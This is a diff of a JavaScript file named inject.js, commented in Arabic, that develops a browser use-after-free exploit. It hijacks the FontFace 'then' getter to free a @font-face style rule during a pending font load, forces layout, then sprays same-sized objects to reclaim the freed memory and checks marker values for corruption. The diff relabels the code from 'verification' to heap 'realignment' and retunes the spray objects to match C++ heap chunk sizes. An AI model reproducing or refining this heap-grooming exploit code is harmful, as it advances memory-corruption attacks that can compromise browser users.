@@ -1,97 +1,99 @@
 /**
- * [MONITORING ENVIRONMENT] - Overlap & Memory Verification Script
+ * [RESEARCH & DEVELOPMENT] - Advanced Dynamic Heap Realignment
  * الملف: inject.js
- * الوظيفة: فحص الكائنات المحجوزة بعد الـ Free للتأكد من حدوث التداخل في الذاكرة
+ * الوظيفة: محاولة مطابقة الحجم الهيكلي عبر كائنات ذات خصائص متعددة (Property Tuning)
  */
 
-// إشعار بدء التشغيل
-ssa("[*] تم تحميل سكريبت التحقق ومراقبة تداخل كتل الذاكرة...");
+ssa("[*] تم تحميل سكريبت إعادة تنظيم الهيكل وتجربة مطابقة الحجم...");
 
-function runMemoryVerification() {
+function runStructureTuning() {
     try {
-        ssa("[*] بدء الفحص: تهيئة مصفوفات المراقبة الأساسية...");
+        ssa("[*] بدء الفحص: تجهيز مصفوفة المراقبة الديناميكية...");
         
-        // مصفوفة لتخزين المراجع لغرض فحصها لاحقاً
-        let checkTargetPool = [];
+        let observationGroup = [];
         
-        // 1. تهيئة الـ Heap بكائنات تتبع ثابتة
-        for (let i = 0; i < 50; i++) {
-            let trackedArray = [1.1, 2.2, 3.3, 4.4];
-            trackedArray.trackingId = 0x1000 + i;
-            trackedArray.verificationMarker = 0xAAAA;
-            checkTargetPool.push(trackedArray);
+        // 1. استخدام كائنات بخصائص مسبقة التعريف لمحاكاة حجم كتل C++ Heap مختلفة
+        for (let i = 0; i < 60; i++) {
+            let obj = {};
+            // إدراج خصائص متتالية لزيادة الحجم الداخلي للكائن في الذاكرة
+            obj.prop1 = 0x11111111;
+            obj.prop2 = 0x22222222;
+            obj.prop3 = 0x33333333;
+            obj.prop4 = 0x44444444;
+            obj.marker = 0xABCDEF; // علامة فحص ثابتة
+            
+            observationGroup.push(obj);
         }
 
-        // 2. إعداد قاعدة عنصر النمط (Style Element)
-        const vStyle = document.createElement('style');
-        vStyle.id = 'verification_style';
-        vStyle.innerHTML = '@font-face { font-family: x; src: url(nonexistent-font.woff); unicode-range: U+0042; }';
-        document.head.appendChild(vStyle);
+        // 2. إعداد عنصر النمط لثغرة الخطوط
+        const dynamicStyle = document.createElement('style');
+        dynamicStyle.id = 'dynamic_vulnerable_style';
+        dynamicStyle.innerHTML = '@font-face { font-family: x; src: url(nonexistent-font.woff); unicode-range: U+0042; }';
+        document.head.appendChild(dynamicStyle);
 
-        // 3. إنشاء كائن الخط
+        // 3. إنشاء كائن الخط وتنشيط الوعد
         let testFace = new FontFace('x', 'local(Helvetica)', { unicodeRange: 'U+0041' });
         document.fonts.add(testFace);
         void testFace.loaded;
 
-        let triggered = false;
+        let activeTrigger = false;
 
-        // 4. اعتراض الـ Thenable Getter وإثارة التحرير
+        // 4. اعتراض معالج التزامن وتطبيق التحرير (Free)
         Object.defineProperty(FontFace.prototype, 'then', {
             configurable: true,
             get() {
-                if (!triggered && this === testFace) {
-                    triggered = true;
-                    ssa("[!!] [RACE_HIT] معالج التزامن نشط الآن.");
+                if (!activeTrigger && this === testFace) {
+                    activeTrigger = true;
+                    ssa("[!!] [THE_RACE] تم الدخول لمعالج التزامن بنجاح.");
 
-                    // أ: التحرير (Free)
-                    document.getElementById('verification_style').sheet.deleteRule(0);
+                    // تحرير الكائن
+                    document.getElementById('dynamic_vulnerable_style').sheet.deleteRule(0);
 
-                    // ب: فرض إعادة الحساب للتأكد من تفعيل التحرير في الـ Heap
+                    // فرض التحديث لإتمام التحرير
                     let layoutFlush = document.body.offsetTop;
 
-                    // ج: محاولة حجز كائنات جديدة بهيكل مختلف لمحاولة ملء الفراغ
-                    for (let k = 0; k < 40; k++) {
-                        let fillArray = [5.5, 6.6, 7.7];
-                        fillArray.marker = 0xBBBB;
+                    // محاولة ملء الفراغ بكائنات مماثلة الحجم فوراً
+                    for (let k = 0; k < 50; k++) {
+                        let fillObj = { p1: 1, p2: 2, p3: 3, p4: 4 };
+                        fillObj.marker = 0x9999;
                     }
                 }
                 return undefined;
             }
         });
 
-        // 5. إطلاق الدالة لبدء الدورة المنطقية
+        // 5. بدء العملية المنطقية عبر دالة التحميل
         document.fonts.load('1em x', 'AB');
 
-        // 6. مرحلة التحقق (Verification Phase)
-        // ننتظر قليلاً لضمان اكتمال العمليات الخلفية للمتصفح ثم نفحص القيم
+        // 6. التحقق من التغيير بعد مهلة زمنية قصيرة
         setTimeout(() => {
-            ssa("[*] بدء مرحلة فحص سلامة وتداخل مصفوفات المراقبة...");
+            ssa("[*] فحص الخصائص الهيكلية للكائنات المفحوصة...");
             
-            let overlapDetected = false;
+            let changeDetected = false;
             
-            for (let m = 0; m < checkTargetPool.length; m++) {
-                // فحص ما إذا كانت الخصائص الثابتة قد تغيرت قيمتها نتيجة التحرير والتداخل
-                if (checkTargetPool[m].verificationMarker !== 0xAAAA) {
-                    ssa("[+] [OVERLAP_CONFIRMED] تم رصد تغير في البنية الهيكلية للمصفوفة رقم: " + m);
-                    overlapDetected = true;
+            for (let m = 0; m < observationGroup.length; m++) {
+                // فحص ما إذا كانت إحدى الخصائص قد تأثرت قيمتها بسبب عمليات الذاكرة الخلفية
+                if (observationGroup[m].marker !== 0xABCDEF) {
+                    ssa("[+] [STRUCT_CHANGE] رصد تغير في محاذاة الكائن رقم: " + m);
+                    changeDetected = true;
                     break;
                 }
             }
 
-            if (!overlapDetected) {
-                ssa("[-] لم يتم رصد تغير مباشر في قيم الخصائص المفحوصة (الكائنات مستقرة مجاورة).");
+            if (!changeDetected) {
+                ssa("[-] مستويات الذاكرة مستقرة مجاورة (لم يتم رصد تداخل مباشر في هذه البنية).");
             }
 
-            ssa("[+] انتهت دورة التحقق الهيكلي بالكامل.");
+            ssa("[+] انتهت دورة الاختبار الحالية.");
         }, 200);
 
-    } catch (e) {
-        ssa("[-] خطأ أثناء فحص وتتبع الذاكرة: " + e.message);
+    } catch (err) {
+        ssa("[-] خطأ أثناء تشغيل الفحص الهيكلي: " + err.message);
     }
 }
 
-// ربط التفعيل بزر التشغيل الخاص بالإطار المرفوع
+// ربط آلية التفعيل بزر التشغيل الخاص بالواجهة المرفوعة
 document.getElementById('exec-btn').addEventListener('click', function() {
-    ssa("[*] تفعيل الفحص المتسلسل للذاكرة...");
-    runMemoryVerification();
+    ssa("[*] إطلاق فحص مطابقة الحجم الذاكري...");
+    runStructureTuning();
 });
